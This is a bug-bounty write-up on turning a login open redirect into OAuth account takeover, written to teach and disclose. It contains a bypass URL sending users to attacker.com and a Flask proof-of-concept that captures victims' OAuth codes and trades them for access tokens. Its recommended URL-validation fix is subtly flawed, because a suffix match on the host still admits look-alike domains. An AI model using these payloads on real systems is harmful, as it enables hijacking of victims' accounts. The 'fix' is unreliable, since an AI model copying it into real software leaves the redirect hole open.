---
layout: post
title: "Open Redirect to Account Takeover: A Chain Reaction"
date: 2024-03-02 14:00:00 +0000
categories: [Bug Hunting, Web Security]
tags: [open-redirect, account-takeover, oauth, bug-bounty]
---

## The Initial Discovery

Hey security enthusiasts! Today, I'm excited to share how I turned a seemingly low-impact open redirect vulnerability into a full account takeover. This story demonstrates why we should never underestimate "low severity" findings.

## The Vulnerability Chain

### Step 1: Open Redirect Discovery

The application had a redirect parameter in its login flow:

```http
GET /login?redirect_to=https://legitimate-site.com
```

The application attempted to validate the URL but had a flawed implementation:

```javascript
function isValidRedirect(url) {
    return url.includes('legitimate-site.com');
}
```

### Step 2: Bypass Analysis

The validation could be bypassed using:
```
/login?redirect_to=https://attacker.com?legitimate-site.com
```

### Step 3: OAuth Integration

The critical factor was the application's OAuth implementation. After discovering the open redirect, I noticed the OAuth flow used the same redirect parameter:

```http
GET /oauth/authorize?
    client_id=xxx&
    redirect_uri=/login?redirect_to=https://legitimate-site.com
```

## The Attack Chain

1. Create malicious OAuth link with redirected callback
2. Victim clicks link and authorizes app
3. OAuth callback is redirected to attacker's server
4. Attacker captures OAuth code
5. Exchange code for access token
6. Access token leads to account takeover

### Proof of Concept

```python
from flask import Flask, request
import requests

app = Flask(__name__)

@app.route('/capture')
def capture():
    code = request.args.get('code')
    # Exchange code for access token
    token = exchange_code_for_token(code)
    # Use token to access victim's account
    return "Code captured!"

def exchange_code_for_token(code):
    response = requests.post(
        'https://target.com/oauth/token',
        data={
            'code': code,
            'client_id': 'xxx',
            'client_secret': 'xxx',
            'grant_type': 'authorization_code'
        }
    )
    return response.json()['access_token']
```

## Impact

This vulnerability chain allowed an attacker to:
1. Create malicious OAuth links
2. Capture victim's OAuth codes
3. Take over victim accounts
4. Access sensitive information
5. Perform actions on behalf of the victim

## Root Cause Analysis

The vulnerability stemmed from:
1. Improper URL validation
2. Lack of strict OAuth callback validation
3. Reuse of redirect parameter in OAuth flow

## The Fix

### URL Validation Fix

```python
from urllib.parse import urlparse

def is_valid_redirect(url):
    try:
        parsed = urlparse(url)
        return parsed.netloc.endswith('legitimate-site.com')
    except:
        return False
```

### OAuth Implementation Fix

1. Whitelist valid OAuth redirect URIs
2. Implement strict callback validation
3. Use state parameter to prevent CSRF
4. Implement PKCE for mobile clients

## Lessons Learned

1. Never underestimate "low severity" findings
2. Always look for vulnerability chains
3. Pay special attention to authentication flows
4. Test OAuth implementations thoroughly

## Timeline

- Initial Discovery: [Redacted]
- Chain Discovery: [Redacted]
- Report Submitted: [Redacted]
- Fix Deployed: [Redacted]
- Bounty Awarded: [Redacted]

## Tools Used

- Burp Suite Professional
- Custom Python scripts
- OWASP ZAP
- Postman

## Defense Recommendations

1. Implement proper URL validation
2. Use strict OAuth callback validation
3. Implement CSRF protection
4. Use security headers
5. Regular security audits

## Conclusion

This finding demonstrates why it's crucial to:
- Think creatively about vulnerability chaining
- Understand the full context of your findings
- Never ignore "low impact" vulnerabilities
- Test authentication flows thoroughly

Remember: Sometimes the most impactful vulnerabilities come from connecting seemingly minor issues into a powerful chain.

Happy hunting! 🎯

---
*Note: All details have been sanitized and shared with permission. Always follow responsible disclosure practices.*